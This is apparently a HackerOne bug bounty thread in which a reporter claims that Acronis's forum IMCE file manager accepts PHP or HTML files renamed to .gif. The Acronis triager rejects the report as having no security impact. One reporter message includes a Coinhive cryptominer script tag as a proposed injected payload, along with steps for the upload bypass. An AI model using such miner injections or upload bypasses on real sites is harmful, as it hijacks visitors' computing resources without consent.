title: Unrestricted file upload vulnerability in IMCE

profile.name: Acronis
profile.about: Acronis sets the standard for cyber protection through its backup, anti-ransomware and cyber infrastructure

vulnerability_information:
## Summary


## Steps To Reproduce
POC
  1. Go to "https://forum.acronis.com/" and creat user
  1. Click on edit profile and go to Signature click on (inser image usig imce file manger)
  1. Now upload php file and bypass to add .gif in the endpoint

## Recommendations
https://www.incibe-cert.es/en/early-warning/vulnerabilities/cve-2006-7109
https://security-tracker.debian.org/tracker/CVE-2006-7109

## Impact

allows remote authenticated users to upload arbitrary PHP code

activities.message:
Hi @bughunter98

Thanks for participating in Acronis bug bounty program!
Our security team usually replies within 1-2 business days.

Meanwhile, I'd recommend you to check out our [policy](https://hackerone.com/acronis).

Hi @bughunter98 

Based on your initial description, there do not appear to be any security implications as a direct result of this behavior. 

Please reply with additional information describing your reasoning. Including a working proof-of-concept can be incredibly helpful in our assessment of these claims. Otherwise, feel free to self-close the report.
When i upload php file directly and open link in browser the automatically download and i can bypass this to add extinction gif
What's the security impact? Were you able to achieve code execution or something else?
The impact here playing with extintion the slow is (jpg png gif) and i bypass that to upload php code.
You can validate extiontions more that.
If php code is not actually executed, then there is no point in such bypass
i agree with you but the right way you should validate extinction more that if anyone change this extension to anything to validate request(validate *.gif *.png *. jpg).
In the profile photo secure as i talk you (The specified file poc.gif could not be uploaded. The image file is invalid or the image type is not allowed. Allowed types: png, jpg, jpeg, png, gif)

Hi @bughunter98 

You should either provide some PoC that this issue could really be exploited or self-close the report. Otherwise, it will be closed as not applicable, since blind upload of php or any other files does not have any security impact if the server handles these files correctly

i miss understanding you how you are not show this no impact here the command not execute but i able to show the source code of file and another imapct i can inject coinhave link and id any one visit this file you will show alert this website is mining and affect bussnis imapct why you not secure this upload.
validate extinctions more than yet to prevent future attack

@bughunter98 

Sorry, but it is very hard for me to understand what you're trying to say. 

> able to show the source code of file

There is no security issue in that.

> inject coinhave link and id any one visit this file you will show alert this website is mining

Can you please clarify this one? Which link are you referring to? If you have any idea in mind, it would be much better to present clear PoC or steps to reproduce than just say that `I can`

I will explain clarify to you and the impact of this issue.
1-in the normal way when you visit php file you are not able to view source code in response.
2-when i bypass this extinctions (*.gif *.png *. jpg) and inject php code that i mean inject javascript code for iframe tag in the source of file.
3-This is simple of script tag
 (<script src="https://coinhive.com/lib/coinhive.min.js"></script>
<script>
var miner = new CoinHive.Anonymous('YOUR-SITE-KEY-HERE');
miner.start();
</script>) 
4-When open this file on browser the browser alert issue of this site.
5-This is simple scenario of this issue when i able play with extensions.

I believe you should understand that ability to view source code of a file uploaded by yourself is not a security issue.

I am not able to reproduce the other issue you've mentioned with the script tag and a miner. Can you please provide better steps to reproduce and a video PoC?

The point that I am trying to show you and you should solve it.
1-Open any editor and type any thing html code , php code ,javascript code and save it anything.gif
2-Try to upload (anything.gif) to profile photo in "https://forum.acronis.com/user/******/edit"
3-You will show the upload failure but try to upload to "https://forum.acronis.com/imce?sendto=CKEDITOR.imce.sendto&type=image&ck_id=edit-field-signature-0-value" the upload success.
4-You should validate extinction you allowed and not add any thing in body of extensions.
Unfortunately, we don't see any security impact here. We have described issues that are currently relevant in our [policy](https://hackerone.com/acronis)
